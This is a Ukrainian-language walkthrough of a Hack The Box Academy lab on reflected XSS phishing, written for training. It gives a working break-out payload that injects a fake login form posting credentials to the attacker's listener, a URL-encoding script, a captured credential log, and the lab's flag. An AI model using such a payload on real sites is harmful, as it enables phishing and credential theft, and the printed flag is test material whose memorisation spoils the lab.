## XSS — Phishing: credential harvesting

**Модуль:** [Cross-Site Scripting (XSS)](https://academy.hackthebox.com/app/module/103)
**Секція:** [Phishing](https://academy.hackthebox.com/app/module/103/section/984)
**Завдання:** Зінжектити фейкову форму → перехопити креди → залогінитись
**Прапор:** `HTB{r3f13c73d_cr3d5_84ck_2_m3}`

***

## Концепція

Reflected XSS у параметрі `?url=` (вставляється в `src` тегу `<img>`) дозволяє зробити `break-out` з атрибута та виконати `document.write()` — підмінити вміст сторінки фейковою формою входу. Жертва вводить креди → GET-запит іде на наш listener.

***

## Крок 1 — Дізнатись свій IP (tun0)

```bash
ip a show tun0
# Запам'ятовуємо OUR_IP (наприклад 10.10.14.214)
```

***

## Крок 2 — HTTP listener

Запускаємо у **окремому терміналі** — він має слухати до моменту відправки URL:

```bash
sudo python3 -m http.server 80
```

***

## Крок 3 — Генерація URL-encoded payload (Python)

Payload містить одинарні лапки та дужки — shell escaping ламає рядок, тому використовуємо Python-файл:

```bash
# Зберігаємо payload у файл
cat > /tmp/payload.txt << 'EOF'
'><script>document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="text" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script>
EOF

# Генеруємо повністю encoded URL
python3 -c "
import urllib.parse
with open('/tmp/payload.txt') as f:
    payload = f.read().strip()
base = 'http://TARGET_IP/phishing/index.php?url='
full = base + urllib.parse.quote(payload)
print(full)
"
```

> Замінити `OUR_IP` на реальний `tun0` IP, `TARGET_IP` — на IP цілі.

Отримуємо URL вигляду:
```
http://TARGET_IP/phishing/index.php?url=%27%3E%3Cscript%3Edocument.write%28...%29%3C%2Fscript%3E
```

***

## Крок 4 — Відправка URL жертві

Відкриваємо у браузері:
```
http://TARGET_IP/phishing/send.php
```

Вставляємо encoded URL у форму → **Send**.

***

## Крок 5 — Перехоплення кредів

У терміналі з listener бачимо:

```
10.129.234.166 - - [16/Jun/2026 03:23:55] "GET /?username=admin&password=p1zd0nt57341myp455&submit=Login HTTP/1.1" 200 -
```

Отримані креди: `admin` / `p1zd0nt57341myp455`

***

## Крок 6 — Логін і прапор

```
http://TARGET_IP/phishing/login.php
```

Вводимо `admin` / `p1zd0nt57341myp455` → прапор на сторінці.

***

## Чому потрібен URL-encoding

| Проблема | Рішення |
|---|---|
| `'` у payload ламає shell-рядок | Зберігаємо у файл через heredoc `<< 'EOF'` |
| `<script>` блокується WAF/браузером без encoding | `urllib.parse.quote()` кодує всі спецсимволи |
| Подвійні/одинарні лапки в JS всередині HTML атрибута | Break-out: `'><script>...` виходить з `src=''` |

***

## Механіка break-out payload

```html
<!-- Оригінальний HTML що генерує сервер: -->
<img src='НАШЕ_ЗНАЧЕННЯ'>

<!-- Після ін'єкції '><script>...: -->
<img src=''><script>document.write(...)...</script>
```

`'` — закриває атрибут `src`, `>` — закриває тег `<img>`, далі виконується `<script>`.

***

## Прапор

```
HTB{r3f13c73d_cr3d5_84ck_2_m3}
```
